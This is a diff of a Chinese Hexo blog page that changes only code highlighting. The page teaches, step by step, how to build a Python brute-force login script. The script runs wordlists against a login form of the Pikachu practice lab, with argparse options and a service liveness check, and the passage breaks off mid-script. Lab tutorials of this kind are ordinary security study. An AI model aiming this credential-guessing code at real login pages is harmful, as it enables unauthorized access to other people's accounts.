@@ -16,7 +16,7 @@
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -171,48 +171,24 @@
 <p>post方法，这样子参数不好确定，抓包看看</p>
 <p><img src="/../image/image-20240720095839240.png" alt="image-20240720095839240"></p>
 <p>可以，确定参数</p>
-<pre><code>username=admin&amp;password=admin&amp;submit=Login
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=admin&amp;submit=Login</span><br></pre></td></tr></table></figure>
+
 <h2 id="获取页面"><a href="#获取页面" class="headerlink" title="获取页面"></a>获取页面</h2><p>这个可以用requests模块，不会用就搜怎么用</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_43404934/article/details/122331463">https://blog.csdn.net/m0_43404934/article/details/122331463</a></p>
-<pre><code class="python">import requests
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line">r = requests.post(url)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
 
-url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;
-r = requests.post(url)
-print(r.text)
-</code></pre>
 <p><img src="/../image/image-20240720103304336.png" alt="image-20240720103304336"></p>
-<h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><pre><code>username=admin&amp;password=admin&amp;submit=Login
-</code></pre>
+<h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=admin&amp;submit=Login</span><br></pre></td></tr></table></figure>
+
 <p>传递参数，requests要求参数要写成key-value的格式，也可以是json的格式，这里我们用字典的形式传参，这里先写个正确的密码，看返回内容会不会改变</p>
 <p>传回来的内容，有点难看，看下给它保存成html文件试试</p>
-<pre><code class="python">with open ( r&#39;HTML.html&#39;, &#39;w+&#39;) as f:
-    f.write(r.text)
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> ( <span class="string">r&#x27;HTML.html&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(r.text)</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240720104937870.png" alt="image-20240720104937870"></p>
 <p>返回成功的标志是success</p>
 <h2 id="判断是否成功"><a href="#判断是否成功" class="headerlink" title="判断是否成功"></a>判断是否成功</h2><p>可以先用简单if in来试试，简单修改下代码</p>
-<pre><code class="python">#!/usr/bin/ python3
-# _*_ coding:utf-8 _*_
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ python3</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">password=<span class="string">&quot;123456&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:password,</span><br><span class="line">    <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;Login&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line"><span class="comment">#print(type(r))</span></span><br><span class="line"><span class="comment"># with open ( r&#x27;HTML.html&#x27;, &#x27;w+&#x27;) as f:</span></span><br><span class="line"><span class="comment">#     f.write(r.text)</span></span><br><span class="line"><span class="comment">#print(r.text)</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]爆破成功：用户名：&quot;</span> + username + <span class="string">&quot;，密码：&quot;</span> + password)</span><br></pre></td></tr></table></figure>
 
-import requests
-username=&quot;admin&quot;
-password=&quot;123456&quot;
-data = &#123;
-    &quot;username&quot;:username,
-    &quot;password&quot;:password,
-    &quot;submit&quot;:&quot;Login&quot;
-&#125;
-
-url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;
-r = requests.post(url,data=data)
-#print(type(r))
-# with open ( r&#39;HTML.html&#39;, &#39;w+&#39;) as f:
-#     f.write(r.text)
-#print(r.text)
-if &quot;success&quot; in r.text:
-    print(&quot;[+]爆破成功：用户名：&quot; + username + &quot;，密码：&quot; + password)
-</code></pre>
 <p><img src="/../image/image-20240720105304209.png" alt="image-20240720105304209"></p>
 <h2 id="结合字典"><a href="#结合字典" class="headerlink" title="结合字典"></a>结合字典</h2><p><img src="/../image/image-20240720105405572.png" alt="image-20240720105405572"></p>
 <p>username.txt（pikachu打错了）</p>
@@ -220,30 +196,12 @@ if &quot;success&quot; in r.text:
 <p>password.txt</p>
 <p><img src="/../image/image-20240720160206509.png" alt="image-20240720160206509"></p>
 <p>读取字典，存为列表</p>
-<pre><code class="python">with open(&quot;username.txt&quot;,&quot;r&quot;) as f1:
-    username = f1.read().split(&quot;\n&quot;)
-with open(&quot;password.txt&quot;,&quot;r&quot;) as f2:
-    password = f2.read().split(&quot;\n&quot;)
-print(username)
-# print(password[1])
-print(password)
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;username.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    username = f1.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    password = f2.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(username)</span><br><span class="line"><span class="comment"># print(password[1])</span></span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240720163133423.png" alt="image-20240720163133423"></p>
 <h2 id="执行爆破run"><a href="#执行爆破run" class="headerlink" title="执行爆破run"></a>执行爆破run</h2><p>我们可以把爆破过程封装成一个函数</p>
-<pre><code class="python">def run(username,pssword,url):
-    for i in username:
-        for j in password:
-            data = &#123;
-                &quot;username&quot;: i,
-                &quot;password&quot;: j,
-                &quot;submit&quot;: &quot;Login&quot;
-            &#125;
-            r = requests.post(url, data=data)
-            if &quot;success&quot; in r.text:
-                print(&quot;[+]爆破成功：用户名：&quot; + i + &quot;，密码：&quot; + j)
-            else:
-                print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username,pssword,url</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: i,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: j,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+]爆破成功：用户名：&quot;</span> + i + <span class="string">&quot;，密码：&quot;</span> + j)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-]爆破失败：用户名：&quot;</span> + i + <span class="string">&quot;，密码：&quot;</span> + j)</span><br></pre></td></tr></table></figure>
+
 <p>然后执行run函数</p>
 <p><img src="/../image/image-20240720163820838.png" alt="image-20240720163820838"></p>
 <p>如果我们只想看成功例子，可以把else注释了</p>
@@ -254,108 +212,42 @@ print(password)
 <p>这里就要用到我们的parser库了，在学习过程 中，发现argparser更好用,下面这个是官中文档，有例子，容易理解</p>
 <p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/argparse.html">https://docs.python.org/zh-cn/3/library/argparse.html</a></p>
 <p>使用 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/argparse.html#module-argparse"><code>argparse</code></a> 的第一步是创建一个 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser"><code>ArgumentParser</code></a> 对象：</p>
-<pre><code class="python">import argparser #导入argparser模块
-parser = argparse.ArgumentParser(description=&#39;参数功能&#39;)
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparser <span class="comment">#导入argparser模块</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
 <p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser"><code>ArgumentParser</code></a> 对象包含将命令行解析成 Python 数据类型所需的全部信息。</p>
 <h3 id="添加参数"><a href="#添加参数" class="headerlink" title="添加参数"></a>添加参数</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MilkLeong/article/details/115639740">https://blog.csdn.net/MilkLeong/article/details/115639740</a></p>
 <p>给一个 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser"><code>ArgumentParser</code></a> 添加程序参数信息是通过调用 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.add_argument"><code>add_argument()</code></a> 方法完成的。通常，这些调用指定 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser"><code>ArgumentParser</code></a> 如何获取命令行字符串并将其转换为对象。这些信息在 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.parse_args"><code>parse_args()</code></a> 调用时被存储和使用。例如：</p>
-<pre><code class="python">parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)
-parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br></pre></td></tr></table></figure>
+
 <p>完成代码</p>
-<pre><code class="python">import argparse #导入模块
-#获取字典数据存为列表
-def get_data(path):
-    with open(path, &quot;r&quot;) as f:
-        data = f.read().split(&quot;\n&quot;)
-    return data
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse <span class="comment">#导入模块</span></span><br><span class="line"><span class="comment">#获取字典数据存为列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line"><span class="built_in">print</span>(username)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-
-parser = argparse.ArgumentParser(description=&#39;参数功能&#39;)
-parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)
-parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)
-args = parser.parse_args()
-username = get_data(args.username)
-password = get_data(args.password)
-print(username)
-print(password)
-</code></pre>
 <p>如果是pycharm可以在Terminal里测试</p>
 <p><img src="/../image/image-20240720171822365.png" alt="image-20240720171822365"></p>
 <p>这里为了方便演示，我就在外面的cmd里演示了</p>
 <p><img src="/../image/image-20240720185111324.png" alt="image-20240720185111324"></p>
 <p><img src="/../image/image-20240720185127470.png" alt="image-20240720185127470"></p>
 <p>可以，这时候我们就可以去改我们的poc了</p>
-<pre><code class="python">#!/usr/bin/ python3
-# _*_ coding:utf-8 _*_
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ python3</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment">#文件读取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line"><span class="comment">#print(username)</span></span><br><span class="line"><span class="comment">#print(password)</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username,pssword,url</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: i,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: j,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+]爆破成功：用户名：&quot;</span> + i + <span class="string">&quot;，密码：&quot;</span> + j)</span><br><span class="line">            <span class="comment"># else:</span></span><br><span class="line">            <span class="comment">#     print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)</span></span><br><span class="line">run(username,password,url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-import requests
-import argparse
-
-#文件读取
-def get_data(path):
-    with open(path, &quot;r&quot;) as f:
-        data = f.read().split(&quot;\n&quot;)
-    return data
-
-
-parser = argparse.ArgumentParser(description=&#39;参数功能&#39;)
-parser.add_argument(&#39;-u&#39;, &#39;--username&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定用户字典&quot;)
-parser.add_argument(&#39;-p&#39;, &#39;--password&#39;, required=True, type=str, metavar=&quot;username.txt&quot;, help=&quot;指定密码字典&quot;)
-args = parser.parse_args()
-username = get_data(args.username)
-password = get_data(args.password)
-#print(username)
-#print(password)
-
-url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;
-def run(username,pssword,url):
-    for i in username:
-        for j in password:
-            data = &#123;
-                &quot;username&quot;: i,
-                &quot;password&quot;: j,
-                &quot;submit&quot;: &quot;Login&quot;
-            &#125;
-            r = requests.post(url, data=data)
-            if &quot;success&quot; in r.text:
-                print(&quot;[+]爆破成功：用户名：&quot; + i + &quot;，密码：&quot; + j)
-            # else:
-            #     print(&quot;[-]爆破失败：用户名：&quot; + i + &quot;，密码：&quot; + j)
-run(username,password,url)
-</code></pre>
 <p><img src="/../image/image-20240720193949945.png" alt="image-20240720193949945"></p>
 <p>成功执行，然后在写这个功能的时候遇到个问题，就是虚拟机挂起了，服务没了，这时候未响应，也没有输出，我们可以做个探活，然后可以看下这篇文章，后续有用</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/heqiang525/article/details/89879056">https://blog.csdn.net/heqiang525/article/details/89879056</a></p>
 <h2 id="扩展二：探测服务存活"><a href="#扩展二：探测服务存活" class="headerlink" title="扩展二：探测服务存活"></a>扩展二：探测服务存活</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/CNXBDSa/article/details/120055796">https://blog.csdn.net/CNXBDSa/article/details/120055796</a></p>
-<pre><code class="python">import requests
-url = &quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;
-try:
-    respone = requests.get(url, timeout=5)
-    print(f&quot;响应状态码：&#123;respone.status_code&#125; -----&gt; &#123;url&#125;&quot;)
-except requests.exceptions.RequestException as e:
-    print(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;e&#125;&quot;)
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    respone = requests.get(url, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;响应状态码：<span class="subst">&#123;respone.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
 <p>原理就是根据响应码来判断，我们先看看服务存活的结果</p>
 <p><img src="/../image/image-20240720200228410.png" alt="image-20240720200228410"></p>
 <p>可以看到是存活的，下面我们把服务关闭试试</p>
 <p><img src="/../image/image-20240720200308097.png" alt="image-20240720200308097"></p>
 <p><img src="/../image/image-20240720200400844.png" alt="image-20240720200400844"></p>
 <p>可以看到返回失败的信息了，当然如果网络状态不好的状况下，我们可以适当提高timeout的时间，我们可以把timeout作为可控参数传递，然后设置好默认的值为5</p>
-<pre><code class="python">parser.add_argument(&#39;-t&#39;, &#39;--timeout&#39;, required=False, type=int, metavar=&quot;5&quot;, help=&quot;设置超时时间&quot;, default=5)
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;5&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;设置超时时间&quot;</span>, default=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
 <p>然后报错信息有时候太多影响体验可以看下这篇</p>
 <p><a target="_blank" rel="noopener" href="https://geek-docs.com/python/python-ask-answer/620_python_getting_exception_details_in_python.html#:~:text=%E5%BD%93Python%E8%A7%A3%E9%87%8A%E5%99%A8%E9%81%87%E5%88%B0%E9%94%99%E8%AF%AF%E6%97%B6%EF%BC%8C%E4%BC%9A%E5%BC%95%E5%8F%91%E4%B8%80%E4%B8%AA%E5%BC%82%E5%B8%B8%E5%AF%B9%E8%B1%A1%E3%80%82,%E8%BF%99%E4%B8%AA%E5%BC%82%E5%B8%B8%E5%AF%B9%E8%B1%A1%E5%8C%85%E5%90%AB%E4%BA%86%E5%87%BA%E9%94%99%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%92%8C%E4%BD%8D%E7%BD%AE%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E3%80%82%20%E9%80%9A%E8%BF%87%E6%8D%95%E8%8E%B7%E5%92%8C%E5%A4%84%E7%90%86%E5%BC%82%E5%B8%B8%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E8%AE%A9%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%E6%97%B6%E4%B8%8D%E4%B8%AD%E6%96%AD%E8%BF%90%E8%A1%8C%EF%BC%8C%E8%80%8C%E6%98%AF%E6%8F%90%E4%BE%9B%E4%B8%80%E4%BA%9B%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA%E6%88%96%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%BA%94%E7%9A%84%E5%A4%84%E7%90%86%E3%80%82">Python 获取Python中的异常详细信息</a></p>
-<pre><code class="python">def check(url, timeout):
-    try:
-        respone = requests.get(url, timeout=timeout)
-        print(f&quot;响应状态码：&#123;respone.status_code&#125; -----&gt; &#123;url&#125;&quot;)
-        return respone.status_code
-    except requests.exceptions.RequestException as e:
-        print(f&quot;请求失败: &#123;url&#125;, 错误信息: &#123;type(e).__name__&#125;&quot;)
-        return
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url, timeout</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        respone = requests.get(url, timeout=timeout)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;响应状态码：<span class="subst">&#123;respone.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> respone.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
+
 <p>这样子报错信息会少很多</p>
 <p><img src="/../image/image-20240720201506459.png" alt="image-20240720201506459"></p>
 <p>也可以测试timeout参数有没有生效，不懂有没有上限，我们设置个10s，在10s内我们把服务重新启动起来看看，我这样子设计不合理，连接是一次请求，一次返回。如果没有明确返回，才会探测，如果直接拒绝连接，导致失败，它都不会等，所以这个实验不靠谱，要限制流量测试才合理，但这个有点难度。。。暂时不测了，先放那。</p>
@@ -377,143 +269,11 @@ except requests.exceptions.RequestException as e:
 <p><img src="/../image/image-20240720203524130.png" alt="image-20240720203524130"></p>
 <p>后面的生产者消费者就不看了，太难了，下面是两种代码</p>
 <p>原版</p>
-<pre><code class="python">#!/usr/bin/ python3
-# _*_ coding:utf-8 _*_
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ python3</span></span><br><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 文件读取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;参数功能&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定用户字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--password&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;username.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;指定密码字典&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--timeout&#x27;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, metavar=<span class="string">&quot;5&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;设置超时时间&quot;</span>, default=<span class="number">5</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">username = get_data(args.username)</span><br><span class="line">password = get_data(args.password)</span><br><span class="line">timeout = args.timeout</span><br><span class="line"><span class="comment"># print(username)</span></span><br><span class="line"><span class="comment"># print(password)</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/pikachu/vul/burteforce/bf_form.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 探活</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url, timeout</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        respone = requests.get(url, timeout=timeout)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;响应状态码：<span class="subst">&#123;respone.status_code&#125;</span> -----&gt; <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> respone.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;url&#125;</span>, 错误信息: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">username, password, url, timeout</span>):</span><br><span class="line">    <span class="keyword">if</span> check(url, timeout) != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> username:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> password:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: i,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: j,</span><br><span class="line">                <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span 